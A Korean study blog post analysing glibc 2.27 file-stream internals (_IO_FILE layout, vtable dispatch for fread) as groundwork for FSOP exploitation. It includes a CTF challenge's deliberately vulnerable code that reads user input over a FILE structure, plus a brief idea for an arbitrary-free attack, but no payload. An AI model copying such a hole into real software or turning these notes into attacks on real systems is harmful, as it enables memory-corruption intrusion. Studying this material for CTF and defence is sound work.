---
title: "FSOP 기법 정리 (File Structure Oriented Programming) in glibc 2.27"
description: "FSOP 기법을 공부한 내용을 정리합니다.. 조금 난잡할 수 있지만 계속 공부하면서 고쳐나가고 있습니다"
date: 2025-11-19 13:49:00 +0900
categories: [Security, System Hacking]
tags: [FSOP]
author: hyungin0505
toc: true
comments: true
# image:
#     path: /assets/img/
#     alt: image alternative text
pin: false
---

---

읽기 전에!! 아무래도 앞부분에서 제일 자세하게 설명이 되어 있다..  
다음 단계에서는 이전 단계 내용을 충분히 숙지하고 있다는 가정 하에 작성한다..  

제일 좋은 건 흐름만 대강 파악하고 직접 분석해보기..  
이 글만 보고 이해하기는 쉽지 않으니 직접 분석해보면서 같이 보면 코드 분석에 도움이 되지 않을까 싶다   
<br>

---

## _IO_FILE AAW (Dreamhack #367) - Arbitrary Address Write

드림핵 367번 문제 풀이를 설명하며 진행하고 싶지만 풀이 공유가 금지되어 있기 때문에 공격 페이로드는 제외하고 익스플로잇에 필요한 이론만 정리해보려 한다  
어차피 드림핵 결제도 안 해서 직접 분석해봐야 문제를 풀 수 있다..ㅠㅠ  

`_IO_FILE` 구조체와 파일 입출력과 관련된 함수의 동작을 파악하기 위해서 glibc 코드를 분석한다  
다만 여기서 설명하려 하는 FSOP 기법은 현재 최신 버전 glibc에서 막혀 있기 때문에 glibc 2.27 코드를 기준으로 분석한다  

~~가능하면 모든 함수들을 타고 들어가보면서 일일히 분석해보고 싶지만 막상 써보니까 분량상 너무 길어지기도 하고 가독성도 떨어지고 오히려 이해하기 힘들 수도 있기 때문에 개인적으로만 분석해보고 익스 원리와 이와 관련된 중요한 내용들만 정리해보려 한다~~   
코드 분석 역량도 기르고 약간의 운영체제 공부도 되는 것 같아서 재밌기도 하니 그냥 되는대로 분석해본다  
<br>

---

### Code Analysis (glibc 2.27)

#### _IO_fread()

```c
// /libio/iofread.c

#include "libioP.h"

_IO_size_t
_IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)
{
  _IO_size_t bytes_requested = size * count;
  _IO_size_t bytes_read;
  CHECK_FILE (fp, 0);
  if (bytes_requested == 0)
    return 0;
  _IO_acquire_lock (fp);
  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);
  _IO_release_lock (fp);
  return bytes_requested == bytes_read ? count : bytes_read / size;
}
libc_hidden_def (_IO_fread)

weak_alias (_IO_fread, fread)
```

`weak_alias()`로 `fread()` 함수를 호출하면 `_IO_fread()` 함수와 같은 동작을 수행하도록 되어 있다  
<br>

---

```c
// /include/libc-symbols.h

/* Define ALIASNAME as a weak alias for NAME.
   If weak aliases are not available, this defines a strong alias.  */
# define weak_alias(name, aliasname) _weak_alias (name, aliasname)
# define _weak_alias(name, aliasname) \
  extern __typeof (name) aliasname __attribute__ ((weak, alias (#name)));
```

`weak_alias()`에 대한 정의는 `/include/libc-symbols.h`{: .filepath}에서 정의되어 있다  
weak 심볼과 관련된 내용은 [여기](https://en.wikipedia.org/wiki/Weak_symbol)에서도 자세히 확인할 수 있다  

그냥 간단하게 `aliasname`을 호출하면 `name`의 동작을 한다 정도로 생각해도 좋을 것 같다  
<br>

---

```c
// /libio/iofread.c

_IO_size_t
_IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)
{
  _IO_size_t bytes_requested = size * count;
  _IO_size_t bytes_read;
  CHECK_FILE (fp, 0);
  if (bytes_requested == 0)
    return 0;
  _IO_acquire_lock (fp);
  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);
  _IO_release_lock (fp);
  return bytes_requested == bytes_read ? count : bytes_read / size;
}
```

`fread()`를 호출했을 때와 같은 동작을 하는 `_IO_fread()` 함수는 `buf`, `size`, `count`와 `fp` 인자를 받는다  

- `buf`는 `fp` 파일 포인터가 가리키는 파일에서 읽은 데이터를 저장할 버퍼 포인터이다  
- `size`에는 버퍼 배열에 저장될 원소 하나의 크기로, 버퍼가 어떤 크기의 배열로 저장될지 결정한다  
- `count`에는 버퍼에 저장할 배열 원소의 개수를 받는다  
- `fp`는 파일 스트림를 가리키는 파일 포인터로 `fopen` 함수의 리턴을 통해 얻을 수 있다  

대충 미리 요약하면, `fread()` 함수는 `fp`가 가리키는 파일에서 `size`*`count`만큼 읽어와 `buf`에 write한다  

함수 자료형이 `_IO_size_t`인데 `fread()`로 읽고 `buf`에 write한 원소의 수를 반환한다  
<br>

---

```c
// /libio/iofread.c

_IO_size_t
_IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)
{
  _IO_size_t bytes_requested = size * count;
  _IO_size_t bytes_read;
  CHECK_FILE (fp, 0);
  if (bytes_requested == 0)
    return 0;
  _IO_acquire_lock (fp);
  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);
  _IO_release_lock (fp);
  return bytes_requested == bytes_read ? count : bytes_read / size;
}
```

`bytes_requested`에는 `size`*`count`를 하여 버퍼 배열의 전체 크기가 저장된다  
`byte_requested`가 0이면 당연히 읽을 필요가 없으므로 0을 반환하며 종료한다  
(0바이트만큼 읽고 썼다는 의미)  

`CHECK_FILE`에서는 `fp`의 `_IO_file_flags`의 매직 마스크를 검사하여 `fp`가 제대로 된 파일 포인터인지 검사한다  
아무튼 `fp`가 파일 스트림 구조체가 아니면 0을 리턴하게 된다  

`_IO_sgetn()` 함수를 호출하는데 `_IO_fread()`에서 인자로 받았던 `fp`, `buf` 그리고 `bytes_requested`를 전달한다  

`_IO_acquire_lock()`은 파일 읽는 동안 다른 곳에서 같은 파일을 사용하지 않도록 락을 걸어주는 것 같다  
마찬가지로 `_IO_release_lock()`은 파일을 다 읽었으니 락을 해제하는게 아닐까..  

모든 동작을 마치고 나면 읽은 바이트 수와 `bytes_requested`가 일치하면 (지정한 길이만큼 성공적으로 읽은 경우) 읽은 배열의 원소 수를 반환한다  
일치하지 않는다면 읽은 만큼의 원소 수만 반환한다  

<details markdown="1">
<summary>CHECK_FILE()</summary>

```c
# define CHECK_FILE(FILE, RET) \
	if ((FILE) == NULL) { MAYBE_SET_EINVAL; return RET; } \
	else { COERCE_FILE(FILE); \
	       if (((FILE)->_IO_file_flags & _IO_MAGIC_MASK) != _IO_MAGIC) \
	  { MAYBE_SET_EINVAL; return RET; }}
```

`FILE`이 null이면 시스템 오류 변수를 `EINVAL`로 설정하고 `RET`를 반환한다  
(`EINVAL`은 Invalid Argument로 부적절한 인수를 의미한다)  

`FILE`이 존재하면 `FILE` 구조체의 `_IO_file_flags` 멤버에 `_IO_MAGIC_MASK`를 AND 연산한다  
`_IO_MAGIC_MASK`는 0xffff0000이기 때문에 `_IO_file_flags` 멤버의 헥스 상위 두 바이트와 `IO_MAGIC`을 비교하게 된다  
`_IO_MAGIC`은 0xfbad0000이므로 `_IO_file_flags` 멤버의 상위 두 바이트가 `0xfbad`인지 확인한다  
(COERCE_FILE()은 그냥 하위호환성을 위한 것이니 넘어가도 좋을 것 같다..)  

`_IO_file_flags`(이하 플래그)를 확인했을 때 제대로 된 파일이 아닌 것 같다고 생각되면 `EINVAL` 설정 후 `RET`을 반환한다  

</details>

<br>

---

#### _IO_sgetn()

```c
// /libio/genops.c

_IO_size_t
_IO_sgetn (_IO_FILE *fp, void *data, _IO_size_t n)
{
  /* FIXME handle putback buffer here! */
  return _IO_XSGETN (fp, data, n);
}
libc_hidden_def (_IO_sgetn)
```

`_IO_fread()`에서 호출되는 `_IO_sgetn()`은 `/libio/genops.c`{: .filepath}에 정의되어 있다  

`fp`는 읽을 파일 스트림 포인터, `data`는 읽어서 저장할 버퍼, `n`은 읽을 크기로, `_IO_XSGETN()`에 그대로 똑같이 들어간다  
<br>

---

#### _IO_XSGETN()

<details markdown="1">

<summary>/libio/libioP.h</summary>

```c
// /libio/libioP.h

#define _IO_JUMPS_FILE_plus(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)

...

# define _IO_JUMPS_FUNC(THIS) \
  (IO_validate_vtable                                                   \
   (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS)	\
	 		     + (THIS)->_vtable_offset)))

...

#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)

...

#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)

...

/* Check if unknown vtable pointers are permitted; otherwise,
   terminate the process.  */
void _IO_vtable_check (void) attribute_hidden;

/* Perform vtable pointer validation.  If validation fails, terminate
   the process.  */
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  /* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
  const char *ptr = (const char *) vtable;
  uintptr_t offset = ptr - __start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}
```

</details>

```c
#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)

...

#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)
```

결과적으로 `_IO_XSGETN(FP, DATA, N)`을 호출하면 `_IO_JUMPS_FUNC(FP)`의 멤버 중 `__xsgetn`을 호출하게 된다  
이때 `__xsgetn`의 인자로는 `FP`, `DATA`, `N`이 들어간다  
<br>

---

```c
// /libio/libioP.h

/* Type of MEMBER in struct type TYPE.  */
#define _IO_MEMBER_TYPE(TYPE, MEMBER) __typeof__ (((TYPE){}).MEMBER)

/* Essentially ((TYPE *) THIS)->MEMBER, but avoiding the aliasing
   violation in case THIS has a different pointer type.  */
#define _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER)        \
  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \
				       + offsetof(TYPE, MEMBER)))

#define _IO_JUMPS(THIS) (THIS)->vtable
#define _IO_JUMPS_FILE_plus(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)

...

# define _IO_JUMPS_FUNC(THIS)                                     \
  (IO_validate_vtable                                             \
   (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS)	\
			     + (THIS)->_vtable_offset)))
```

그러면 `_IO_JUMPS_FUNC(FP)`의 동작은 무엇인지 봐야 한다    

<details markdown="1">
<summary>Macro</summary>

분석하기 위해 필요한 매크로들을 하나하나 해석해보면 `_IO_MEMBER_TYPE`에서는 `__typeof__`를 사용하여 `TYPE` 타입의 빈 배열의 멤버 타입을 가져와 결과적으로는 `MEMBER`의 타입을 얻는다  

`_IO_CAST_FIELD_ACCESS`는 `THIS`(주로 파일 디스크립터)에서 `TYPE` 타입을 가진 `MEMBER`가 위치한 메모리 주소를 얻어 접근한다    
<br>

> 1. `offsetof`로 `MEMBER`가 `TYPE` 사이의 오프셋을 구한다  
> 2. `THIS`에 오프셋을 더해 `MEMBER`의 주소를 얻는다  
> 3. 해당 주소를 `MEMBER`의 타입 포인터로 지정 후 참조한다  
{: .prompt-info}
<br>

```c
// /libio/libioP.h

/* We always allocate an extra word following an _IO_FILE.
   This contains a pointer to the function jump table used.
   This is for compatibility with C++ streambuf; the word can
   be used to smash to a pointer to a virtual function table. */

struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```

위 매크로들을 토대로 해석하면 `_IO_JUMPS_FILE_plua`는 `_IO_FILE_plus` 구조체 내부 `vtable` 멤버에 접근한다  

</details>

`_IO_JUMPS_FUNC(THIS)`는 `_IO_JUMPS_FILE_plus(THIS)`의 리턴값인 `vtable` 멤버에 `_vtable_offset`을 더하여 실제 `vtable` 주소를 `_IO_jump_t` 구조체로 캐스트하고 참조한다  
이렇게 얻은 `vtable` 포인터를 `IO_validate_vtable()`에 넘겨서 검증한다  
검증을 마치고 나면 그 리턴값을 사용한다 (검증을 제대로 통과하면 `vtable`을 그대로 반환한다)  
<br>

<details markdown="1">
<summary>IO_validate_vtable()</summary>

```c
// /libio/libioP.h

/* Perform vtable pointer validation.  If validation fails, terminate
   the process.  */
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  /* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
  const char *ptr = (const char *) vtable;
  uintptr_t offset = ptr - __start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}
```

`vtable`이 올바른지 검사하는 함수이다  

`section_length`는 libc 영역의 `_IO_vtables` 영역의 길이이다  
`ptr` 포인터에는 `vtable` 포인터가 들어간다  

`offset`은 `ptr` 포인터에서 libc 영역의 `_IO_vtables` 영역의 시작점을 뺀 값으로,`ptr`, 즉 `vtable`이 libc 영역의 `_IO_vtables`에서의 오프셋을 의미한다  

`offset`이 `section_length` 보다 크거나 같다면 `_IO_vtables` 영역 바깥에 있는 것이므로 `_IO_vtable_chekc()` 함수를 실행한다  
만약 `_IO_vtables` 영역에 제대로 놓인 `vtable`이라면 그대로 `vtable` 주소를 반환하여 사용할 수 있도록 한다  

</details>

<br>

---

```c
// /libio/libioP.h

#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)

...

#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)
```

그러면 결과적으로 `_IO_XSGETN()`은 `JUMP2`를 호출하게 되고, `JUMP2`는 `FP` 구조체 `vtable`의 `__xsgetn`을 호출하게 된다  
<br>

---

#### __xsgetn

```c
// /libio/libioP.h

struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

`_IO_jump_t` 구조체에서 `__xsgetn`은 `_IO_xsgetn_t`를 타입을 가진다  
`__xsgetn` 위치에 어떤 함수의 포인터가 있느냐에 따라 동작이 결정되는데 해당 위치에 어떤 함수의 포인터가 들어가는지 확인할 수 있는 코드는 찾지 못했다..  
나중에 다시 확인해 볼 때가 오게 되서 찾게 된다면 추가하겠다  
<br>

---

```c
// /libio/fileops.c

const struct _IO_jump_t _IO_file_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_file_finish),
  JUMP_INIT(overflow, _IO_file_overflow),
  JUMP_INIT(underflow, _IO_file_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_default_pbackfail),
  JUMP_INIT(xsputn, _IO_file_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_new_file_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, _IO_new_file_sync),
  JUMP_INIT(doallocate, _IO_file_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
libc_hidden_data_def (_IO_file_jumps)
```

`/libio/fileops.c`{: .filepath}에 이런 코드가 있긴 하나 이 내용이 들어가는 로직을 찾지 못해서 동적으로 분석해보기로 한다  

<details markdown="1">
<summary>JUMP_INIT()</summary>

```c
// /libio/libioP.h

#define JUMP_INIT(NAME, VALUE) VALUE
```

JUMP_INIT은 그냥 VALUE를 내놓는 매크로이므로 아마 여기서 초기화되는게 아닐까 싶다..  

</details>

<br>

---

```c
// Dreamhack 367 코드 일부

#include <stdio.h>
#include <unistd.h>
#include <string.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  FILE *fp;

  char file_buf[1024];

  init();

  fp = fopen("/etc/issue", "r");

  printf("Data: ");

  read(0, fp, 300);

  fread(file_buf, 1, sizeof(file_buf)-1, fp);

  ...

  fclose(fp);
}
```

위처럼 `fopen()`으로 `fp`를 얻고 `fread()`를 하는 코드로 동적 분석을 해보도록 하자  
<br>

---

![Image](/assets/img/251102_0/_IO_FILE_plus.png)

pwndbg로 `fopen()`을 호출한 후 RAX 레지스터에는 `fopen()`의 리턴값인 파일 스트림 포인터가 들어있다   

`_IO_FILE_plus` 구조체는 `_IO_FILE` 포인터와 `vtable`을 멤버로 갖는다  
때문에 해당 파일 포인터를 `_IO_FILE_plus` 구조체로 출력하면 `_IO_FILE` 구조체와 `vtable`의 주소가 나온다  
<br>

<details markdown="1">
<summary>_IO_FILE_plus</summary>

```c
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```

</details>

<br>

---

![Image](/assets/img/251102_0/symbol_xsgetn.png)

`vtable` 안에 있는 `__xsgetn`에 있는 주소의 심볼을 확인하면 `_IO_file_xsgetn`인 것을 알 수 있다  
(심볼에 `__Gl__`이 붙어있는데 이건 전역에 해당 심볼이 적용된다는 의미이다)  

따라서 `__xsgetn`은 `_IO_file_xsgetn`으로 이어지는 걸로 보면 된다  

지금까지의 내용을 정리하면 `fread()` -> `_IO_fread()` -> `_IO_sgetn()` -> `_IO_XSGETN()` -> `__xsgetn` -> `_IO_file_xsgetn()`의 흐름으로 진행된다  
(내가 쓰다가 내가 이해가 안 되서 정리해봤다..)  
<br>

---

#### _IO_file_xsgetn()

<details markdown="1">

<summary>_IO_file_xsgetn()</summary>

```c
// /libio/fileops.c

_IO_size_t
_IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)
{
  _IO_size_t want, have;
  _IO_ssize_t count;
  char *s = data;

  want = n;

  if (fp->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_IO_save_base != NULL)
	{
	  free (fp->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_doallocbuf (fp);
    }

  while (want > 0)
    {
      have = fp->_IO_read_end - fp->_IO_read_ptr;
      if (want <= have)
	{
	  memcpy (s, fp->_IO_read_ptr, want);
	  fp->_IO_read_ptr += want;
	  want = 0;
	}
      else
	{
	  if (have > 0)
	    {
	      s = __mempcpy (s, fp->_IO_read_ptr, have);
	      want -= have;
	      fp->_IO_read_ptr += have;
	    }

	  /* Check for backup and repeat */
	  if (_IO_in_backup (fp))
	    {
	      _IO_switch_to_main_get_area (fp);
	      continue;
	    }

	  /* If we now want less than a buffer, underflow and repeat
	     the copy.  Otherwise, _IO_SYSREAD directly to
	     the user buffer. */
	  if (fp->_IO_buf_base
	      && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))
	    {
	      if (__underflow (fp) == EOF)
		break;

	      continue;
	    }

	  /* These must be set before the sysread as we might longjmp out
	     waiting for input. */
	  _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
	  _IO_setp (fp, fp->_IO_buf_base, fp->_IO_buf_base);

	  /* Try to maintain alignment: read a whole number of blocks.  */
	  count = want;
	  if (fp->_IO_buf_base)
	    {
	      _IO_size_t block_size = fp->_IO_buf_end - fp->_IO_buf_base;
	      if (block_size >= 128)
		count -= want % block_size;
	    }

	  count = _IO_SYSREAD (fp, s, count);
	  if (count <= 0)
	    {
	      if (count == 0)
		fp->_flags |= _IO_EOF_SEEN;
	      else
		fp->_flags |= _IO_ERR_SEEN;

	      break;
	    }

	  s += count;
	  want -= count;
	  if (fp->_offset != _IO_pos_BAD)
	    _IO_pos_adjust (fp->_offset, count);
	}
    }

  return n - want;
}
libc_hidden_def (_IO_file_xsgetn)
```

</details>

```c
_IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)
```

우선 `_IO_file_xsgetn()` 함수를 분석하기에 앞서 `_IO_file_xsgetn()` 함수 내에서 `fp` 구조체의 멤버들을 확인하거나 사용하기 때문에 `fp` 포인터가 가리키는 파일 스트림 구조체인 `_IO_FILE`에 대해서 잘 알아두는 게 좋다   

참고로, `_IO_FILE` 구조체는 프로세스 실행 중 `fopen()`을 통해 할당되기 때문에 힙 영역에 위치한다  
<br>

---

<details markdown="1">
<summary>_IO_FILE</summary>

```c
// /libio/bits/libio.h

struct _IO_FILE {
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

![Image](/assets/img/251102_0/_IO_FILE.png)

`fopen()` 함수에 브포를 걸고 호출한 후 `RAX` 레지스터 값을 `_IO_FILE` 구조체 형식으로 출력해보면 위 코드와 구성이 같다는 것을 확인할 수 있다    
<br>

---

```c
int _flags;		/* 0x0 */
/* 상위 2바이트는 0xfbad(_IO_MAGIC)로 고정된 매직 넘버, 나머지는 플래그 비트로 사용 */
/* 플래그 비트 관련한 내용은 후술 */

/* 파일에서 데이터를 read할 때 사용되는 읽기 버퍼 포인터로, fscanf, fread 등 함수가 호출될 때 사용됨 */
char* _IO_read_ptr;	/* 읽기 버퍼에서 현재 read 중인 위치 */ /* 0x8 */
char* _IO_read_end;	/* 읽기 버퍼가 끝나는 위치 */ /* 0x10 */
char* _IO_read_base;	/* 읽기 버퍼가 시작되는 위치 */ /* 0x18 */

/* 파일에 데이터를 write할 때 사용되는 쓰기 버퍼 포인터로, fprintf, fwrite 등 함수가 호출될 때 사용됨 */
char* _IO_write_base;	/* 쓰기 버퍼가 시작되는 위치 */ /* 0x20 */
char* _IO_write_ptr;	/* 쓰기 버퍼에서 현재 write 중인 위치 */ /* 0x28 */
char* _IO_write_end;	/* 쓰기 버퍼가 끝나는 위치 */ /* 0x30 */

/* 실제로 데이터가 저장되는 메모리 버퍼 포인터 */
char* _IO_buf_base;	/* 버퍼가 시작되는 위치 */ /* 0x38 */
char* _IO_buf_end;	/* 버퍼가 끝나는 위치 */ /* 0x40 */

/* ungetc 함수 등으로 읽었던 문자를 다시 스트림으로 되돌릴 때 사용되는 포인터 */
char *_IO_save_base; /* 백업 모드로 진입하기 전, 원래 사용 중이던 읽기 버퍼의 시작 주소를 저장하는 포인터 */ /* 0x48 */
char *_IO_backup_base;  /* 백업 영역의 첫 유효 문자가 있는 위치 */ /* 0x50 */
char *_IO_save_end; /* 원래 사용 중이던 읽기 버퍼의 끝 주소를 저장하는 포인터 */ /* 0x58 */

struct _IO_marker *_markers;  /* 스트림 버퍼의 특정 위치(오프셋)를 저장하는 _IO_marker 구조체 단일 연결 리스트 포인터 */ /* 0x60 */

struct _IO_FILE *_chain;  /* LIFO 리스트 형태로 다른 _IO_FILE 구조체와 단일 연결 리스트 */ /* 0x68 */
/* stdin -> stdout -> stderr 순서대로 연결 */
/* 리스트 헤더는 _IO_list_all에 저장 */

int _fileno;  /* fopen() 함수에서 리턴된 fd 값 */ /* 0x70 */
/* stdin-0, stdout-1, stderr-2 */

int _flags2; /* 0x74 */

_IO_off_t _old_offset; /* This used to be _offset but it's too small.  */ /* 0x78 */

unsigned short _cur_column; /* 0x80 */
signed char _vtable_offset; /* 0x82 */
char _shortbuf[1]; /* 0x83 */

_IO_lock_t *_lock; /* 0x88 */

/* 보통 더미값으로 \x00 * 0x48 존재 */
/* _offset, _codecvt, _wide_data, _freeres_list, _freeres_buf, __pad5, _mode, _unused2 */
/* vtable : 후술 */ /* 0xd8 */
```

`_flags` 멤버에는 매직 넘버와 함께 파일 권한을 나타내는 플래그 비트들이 저장된다 

`_IO_buf_base` 또는 `_IO_buf_end`는 stdin으로 입력받거나 stdout으로 출력할 때 사용된다  

</details>

<br>

---

```c
// /libio/fileops.c

if (fp->_IO_buf_base == NULL)
  {
    /* Maybe we already have a push back pointer.  */
    if (fp->_IO_save_base != NULL)
{
  free (fp->_IO_save_base);
  fp->_flags &= ~_IO_IN_BACKUP;
}
    _IO_doallocbuf (fp);
  }
```

`_IO_buf_base`가 Null이고, `_IO_save_base`가 Null이 아니면 `_IO_save_base`의 주소를 해제한다  
후에 BACKUP 상태를 나타내는 플래그를 끈다  

`_IO_buf_base`가 Null이라는 것은 현재 해당 파일 스트림에 데이터를 임시로 저장할 버퍼가 할당되지 않았다는 것을 의미한다  
보통 프로그램에서 `fopen()`으로 파일을 처음 열었을 때에는 `_IO_buf_base`가 Null이다  

만약 이전에 push-back(되돌리기)을 위해서 임시로 만든 백업 버퍼가 있다면 `_IO_save_base`가 Null이 아닌 상태이다   
때문에 새 버퍼를 할당하기 전에 백업 버퍼를 해제하고 백업 중이라는 플래그 비트를 꺼버리는 것이다  
메인 버퍼를 새로 할당해야 할 때 백업 버퍼가 남아있으면 불필요한 메모리이기 때문에 해제해주어야 한다  

이후 `_IO_doallocbuf()` 함수로 버퍼를 할당한다  
파일 스트림에 버퍼가 없는 상태에 백업 버퍼까지 정리되었으므로 데이터를 읽기 위해 메인 버퍼를 만들어야 한다  
여기서 스트림에 필요한 버퍼 메모리를 힙 영역에서 할당하고 `_IO_buf_base`와 `_IO_buf_end`를 할당한 버퍼의 시작과 끝으로 설정한다  
<br>

> 근데 여기서 `_IO_buf_base`를 Null로 덮어쓰고 `_IO_save_base`에 임의의 주소를 덮어쓰고 `fread()`를 호출하면 임의 주소를 강제로 `free()`하는 공격 기법도 가능하지 않을까.. 라는 생각..  
<br>

<details markdown="1">
<summary>_IO_doallocbuf()</summary>

```c
void
_IO_doallocbuf (_IO_FILE *fp)
{
  if (fp->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED) || fp->_mode > 0)
    if (_IO_DOALLOCATE (fp) != EOF)
      return;
  _IO_setb (fp, fp->_shortbuf, fp->_shortbuf+1, 0);
}
libc_hidden_def (_IO_doallocbuf)
```

중복 할당을 막기 위해 `_IO_buf_base`가 할당되어 있지 않은 상태인지 먼저 확인한다  

플래그 비트에 `_IO_UNBUFFERED`(0x2)가 설정되어 있지 않거나 `_mode`가 0보다 크다면 `_IO_DOALLOCATE()` 매크로가 실행된다  
(스트림이 `fputwc`, `fgetwc`, `wprintf`와 같은 와이드 문자열 함수를 호출하면 `_mode`가 0보다 큰 양수로 설정된다)  

그리고 만약 `_IO_DOALLOCATE()`가 실패하면 `_IO_setb()` 함수를 실행하게 된다  
여기서 `_IO_buf_base` 값이 저장된다  

<details>
<summary>fp -> _mode</summary>

파일 스트림 구조체의 `_mode` 멤버는 스트림의 orientation을 나타낸다  
쉽게 말하면 해당 파일 스트림이 일반적인 `char` 1바이트 문자를 처리하는지 아니면 `wcahr_t` 와이드 문자를 처리하는지를 나타낸다  

- **0** : Unoriented / 미결정  
  - `fopen()` 등으로 파일 스트림을 이제 막 얻었을 때의 초기 상태  
  - 아직 스트림의 방향성이 결정되지 않은 경우를 의미  
- **-1** 또는 음수 : Byte-oriented / 바이트 지향  
  - 스트림에서 `fputc`, `fgetc`, `fread`, `fwrite`, `printf` 등 함수가 처음 호출되면 `_mode` 음수로 설정  
  - 한 번 설정되면 `char` 타입의 입출력만 처리하도록 고정  
- **1** 또는 양수 : Wide-character-oriented / 와이드 문자 지향  
  - 스트림에서 `fputwc`, `fgetwc`, `wprintf` 등 함수가 처음 호출되면 `_mode` 양수로 설정  
  - 한 번 설정되면 `wchar_t` 타입의 입출력만 처리하도록 고정  
</details>

<br>

---

